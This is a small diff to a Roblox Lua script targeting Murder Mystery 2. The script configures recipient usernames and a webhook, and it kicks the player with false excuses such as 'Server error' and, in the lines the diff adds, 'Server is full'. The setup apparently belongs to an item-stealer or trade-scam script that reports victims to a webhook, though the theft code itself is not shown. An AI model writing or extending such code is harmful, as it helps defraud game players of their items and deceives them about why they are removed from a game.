@@ -11,17 +11,22 @@ local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
 if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add username or webhook")
+    plr:Kick("You didn't add username or webhook")
     return
 end
 
 if game.PlaceId ~= 142823291 then
-    plr:kick("Game not supported. Please join a normal MM2 server")
+    plr:Kick("Game not supported. Please join a normal MM2 server")
     return
 end
 
 if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:kick("Server error. Please join a DIFFERENT server")
+    plr:Kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if #Players:GetPlayers() >= 12 then
+    plr:Kick("Server is full. Please join a less populated server")
     return
 end
 
